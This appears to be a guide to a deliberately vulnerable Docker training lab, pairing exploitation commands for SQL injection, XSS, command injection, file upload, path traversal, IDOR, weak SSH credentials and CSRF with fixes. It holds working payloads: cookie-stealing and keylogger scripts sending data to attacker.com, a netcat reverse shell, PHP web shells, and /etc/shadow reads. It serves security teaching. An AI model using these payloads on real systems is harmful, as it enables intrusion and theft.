# Vulnerability Guide

This guide details all intentional security vulnerabilities in the Docker Security Lab environment.

## SQL Injection

### Description
The login form is vulnerable to SQL injection due to direct string concatenation in the database query without parameterization or input sanitization.

### Vulnerable Code Location
File: `vulnerable-app/index.php` (lines 25-30)

```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

### Exploitation Techniques

#### Authentication Bypass
```bash
# Basic OR injection
curl -X POST http://localhost:8080 \
  -d "username=admin' OR '1'='1&password=anything"

# Comment-based bypass
curl -X POST http://localhost:8080 \
  -d "username=admin'--&password=anything"

# Union-based injection
curl -X POST http://localhost:8080 \
  -d "username=admin' UNION SELECT 1,2,3--&password=anything"
```

#### Automated Testing
```bash
# Using sqlmap
sqlmap -u "http://localhost:8080" --forms --batch --level=3 --risk=3
sqlmap -u "http://localhost:8080" --forms --batch --dump
sqlmap -u "http://localhost:8080" --forms --batch --os-shell
```

### Impact
- Complete authentication bypass
- Unauthorized access to admin functionality
- Potential data extraction
- Database manipulation

## Cross-Site Scripting (XSS)

### Description
User input is directly reflected in HTML output without proper encoding or sanitization, allowing execution of malicious JavaScript.

### Vulnerable Code Location
File: `vulnerable-app/index.php` (line 35)

```php
echo "<h2>Welcome " . $_POST['username'] . "!</h2>";
```

### Exploitation Techniques

#### Reflected XSS
```javascript
// Basic alert payload
<script>alert('XSS Vulnerability Found!')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Session hijacking
<script>fetch('http://attacker.com/log.php?session='+document.cookie)</script>
```

#### Advanced Payloads
```javascript
// DOM manipulation
<script>document.body.innerHTML='<h1 style="color:red">WEBSITE COMPROMISED</h1>'</script>

// Keylogger
<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keys.php?key='+e.key)})</script>

// Form hijacking
<script>document.forms[0].action='http://attacker.com/harvest.php'</script>
```

### Testing Methods
```bash
# Manual testing in browser
# Navigate to http://localhost:8080
# Username: <script>alert('XSS')</script>
# Password: anything

# Automated scanning
nikto -h http://localhost:8080
```

## Command Injection

### Description
The ping functionality executes user input directly in shell commands without proper validation or sanitization.

### Vulnerable Code Location
File: `vulnerable-app/index.php` (line 8)

```php
$output = shell_exec("ping -c 1 " . $host);
```

### Exploitation Techniques

#### Command Chaining
```bash
# Execute additional commands with semicolon
curl "http://localhost:8080/?ping=1&host=localhost;cat%20/etc/passwd"

# Use AND operator
curl "http://localhost:8080/?ping=1&host=localhost%26%26whoami"

# Use OR operator
curl "http://localhost:8080/?ping=1&host=localhost%7C%7Cid"

# Command substitution
curl "http://localhost:8080/?ping=1&host=localhost%60whoami%60"
```

#### Advanced Exploitation
```bash
# Reverse shell (URL encoded)
curl "http://localhost:8080/?ping=1&host=localhost;nc%20-e%20/bin/bash%20attacker_ip%204444"

# File system exploration
curl "http://localhost:8080/?ping=1&host=localhost;find%20/%20-name%20%22*.conf%22"

# Environment variable disclosure
curl "http://localhost:8080/?ping=1&host=localhost;env"
```

### Impact
- Remote code execution
- System information disclosure
- File system access
- Potential reverse shell access

## File Upload Vulnerability

### Description
The file upload functionality lacks proper validation, allowing upload of malicious files including PHP shells and executable scripts.

### Vulnerable Code Location
File: `vulnerable-app/upload.php`

### Exploitation Techniques

#### PHP Web Shell Upload
```bash
# Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload the shell
curl -F "upload=@shell.php" http://localhost:8080/upload.php

# Execute commands through the shell
curl "http://localhost:8080/uploads/shell.php?cmd=whoami"
curl "http://localhost:8080/uploads/shell.php?cmd=ls%20-la"
curl "http://localhost:8080/uploads/shell.php?cmd=cat%20/etc/passwd"
```

#### Advanced Payloads
```php
// More sophisticated web shell
<?php
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
```

### Impact
- Remote code execution
- Web shell deployment
- Server compromise
- Data exfiltration

## Directory Traversal

### Description
The file parameter allows reading arbitrary files from the system by manipulating the file path.

### Vulnerable Code Location
File: `vulnerable-app/index.php` (lines 15-19)

### Exploitation Techniques

#### Basic Path Traversal
```bash
# Read system files
curl "http://localhost:8080/?file=../../../etc/passwd"
curl "http://localhost:8080/?file=../../../etc/shadow"
curl "http://localhost:8080/?file=../../../etc/hosts"

# Read application files
curl "http://localhost:8080/?file=../../../var/www/html/index.php"
curl "http://localhost:8080/?file=../../../var/log/apache2/access.log"
```

#### Advanced Techniques
```bash
# Null byte injection (older PHP versions)
curl "http://localhost:8080/?file=../../../etc/passwd%00.txt"

# URL encoding
curl "http://localhost:8080/?file=..%2F..%2F..%2Fetc%2Fpasswd"

# Double encoding
curl "http://localhost:8080/?file=..%252F..%252F..%252Fetc%252Fpasswd"
```

### Impact
- Sensitive file disclosure
- Configuration file access
- Source code exposure
- System information leakage

## Insecure Direct Object Reference (IDOR)

### Description
User profiles and resources are accessible without proper authorization checks, allowing access to other users' data.

### Vulnerable Code Location
File: `vulnerable-app/index.php` (lines 21-25)

### Exploitation Techniques

#### Sequential ID Enumeration
```bash
# Access different user profiles
curl "http://localhost:8080/?user_id=1"
curl "http://localhost:8080/?user_id=2"
curl "http://localhost:8080/?user_id=100"

# Try negative numbers
curl "http://localhost:8080/?user_id=-1"

# Try large numbers
curl "http://localhost:8080/?user_id=999999"
```

#### Automated Enumeration
```bash
# Using Burp Suite Intruder or custom script
for i in {1..100}; do
    curl -s "http://localhost:8080/?user_id=$i" | grep -q "User Profile" && echo "Valid ID: $i"
done
```

### Impact
- Unauthorized data access
- Privacy violations
- Information disclosure
- Horizontal privilege escalation

## Weak SSH Credentials

### Description
SSH server configured with default and weak credentials, making it vulnerable to brute force attacks.

### Vulnerable Configuration
- **admin:admin**
- **test:test**
- **guest:guest**
- **root:toor**

### Exploitation Techniques

#### Manual Login
```bash
# Direct SSH access
ssh admin@localhost -p 2222  # password: admin
ssh root@localhost -p 2222   # password: toor
```

#### Brute Force Attack
```bash
# Using hydra
hydra -l admin -p admin ssh://localhost:2222
hydra -L users.txt -P passwords.txt ssh://localhost:2222

# Using nmap scripts
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt localhost -p 2222
```

### Impact
- Unauthorized system access
- Remote command execution
- File system access
- Lateral movement potential

## Information Disclosure

### Description
The admin page reveals sensitive configuration information without proper access controls.

### Vulnerable Code Location
File: `vulnerable-app/admin.php`

### Exposed Information
- Database connection strings
- API keys and secrets
- Debug information
- System configuration
- PHP configuration (phpinfo)

### Exploitation
```bash
# Access admin page directly
curl "http://localhost:8080/admin.php"

# Extract sensitive information
curl -s "http://localhost:8080/admin.php" | grep -E "(password|key|secret|database)"
```

### Impact
- Credential exposure
- System architecture disclosure
- Attack surface expansion
- Further exploitation opportunities

## Cross-Site Request Forgery (CSRF)

### Description
Admin functions lack CSRF protection, allowing attackers to perform actions on behalf of authenticated users.

### Vulnerable Code Location
File: `vulnerable-app/admin.php`

### Exploitation
```html
<!-- Malicious HTML page -->
<form action="http://localhost:8080/admin.php" method="POST" id="csrf">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="user_id" value="1">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Impact
- Unauthorized actions
- Data manipulation
- Administrative function abuse
- User account compromise

## Remediation Guidelines

### General Security Practices
1. **Input Validation**: Validate and sanitize all user inputs
2. **Output Encoding**: Properly encode output to prevent XSS
3. **Parameterized Queries**: Use prepared statements for database queries
4. **Access Controls**: Implement proper authentication and authorization
5. **File Upload Security**: Validate file types, sizes, and contents
6. **Error Handling**: Implement secure error handling without information disclosure
7. **Security Headers**: Implement security headers (CSP, HSTS, etc.)
8. **Regular Updates**: Keep systems and dependencies updated

### Specific Fixes
- Use PDO with prepared statements for database queries
- Implement htmlspecialchars() for output encoding
- Use escapeshellarg() for command line parameters
- Implement file type validation and secure upload directories
- Add CSRF tokens to forms
- Implement proper session management
- Use strong, unique passwords and multi-factor authentication
